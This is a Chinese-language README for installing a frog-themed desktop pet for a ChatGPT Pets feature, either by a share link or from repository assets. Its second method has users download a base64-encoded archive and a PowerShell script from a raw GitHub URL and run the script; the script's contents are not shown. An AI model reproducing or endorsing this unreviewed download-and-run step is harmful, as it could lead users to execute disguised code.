# 奶蛙桌宠使用教程

奶蛙是一个 ChatGPT Pets 动态桌宠。推荐直接采用分享链接；如果链接暂时不可用，也可以从本仓库下载素材自行创建。

## 方法一：一键采用（推荐）

1. 使用支持 ChatGPT Pets 的 ChatGPT 账号登录。
2. 打开奶蛙的公开分享链接：[采用奶蛙](https://chatgpt.com/s/sharepet_6ad209a270e08191be5404a6a8bfcb0e)。
3. 按页面提示选择“采用 / Adopt”。采用后，奶蛙会复制到你自己的 Pets 库。
4. 在 ChatGPT Pets 中选择奶蛙并设为当前宠物，即可使用。

这是公开分享链接，任何拿到链接的人都可以采用一份自己的副本。副本属于采用者自己的 Pets 库；不会把你的宠物库或账号身份分享出去。

## 方法二：从仓库素材自行创建

1. 下载素材文件：[naiwa-pet-assets.zip.b64](https://raw.githubusercontent.com/spade0123/my-GPTplus-trial/main/naiwa/naiwa-pet-assets.zip.b64) 和 [restore-archive.ps1](https://raw.githubusercontent.com/spade0123/my-GPTplus-trial/main/naiwa/restore-archive.ps1)，保存到同一个文件夹。
2. 在该文件夹打开 PowerShell，运行：
   ```powershell
   .\restore-archive.ps1
   ```
   脚本会还原出 `naiwa-pet-assets.zip`。解压后找到 `spritesheet.png`。
3. 在 ChatGPT Work 中使用 Pets 功能，上传 `spritesheet.png` 并发送类似请求：

   ```text
   请用这张精灵表创建一个名为“奶蛙”的自定义宠物，并设为当前宠物。
   它是黄色、圆润的蛙形角色；待机时抱着肚子，偶尔做若有所思的动作，
   眼神要自然变化。戳肚子的表情和波纹效果放在反应动作里。
   ```

   Pets 会检查精灵表后创建宠物。若你的 ChatGPT 账号没有 Pets 功能或无法上传精灵表，请使用上方的一键采用链接。

## 动作说明

精灵表包含待机、移动、挥手、跳跃、等待、失败、查看等动画，以及多方向视线变化。戳肚子的半眯眼鼓脸和肚皮回弹波纹已放入反应动画。

当前 Pets 接口没有可配置的“点击肚子”事件绑定，所以肚子受戳后是否播放该反应，取决于 ChatGPT Pets 自身的触发逻辑，无法保证。

## 素材内容

还原后的 ZIP 包含 v2 精灵表、GIF/MP4 动画预览、单动作预览、注视方向图、静帧总览、生成提示词和说明文档。
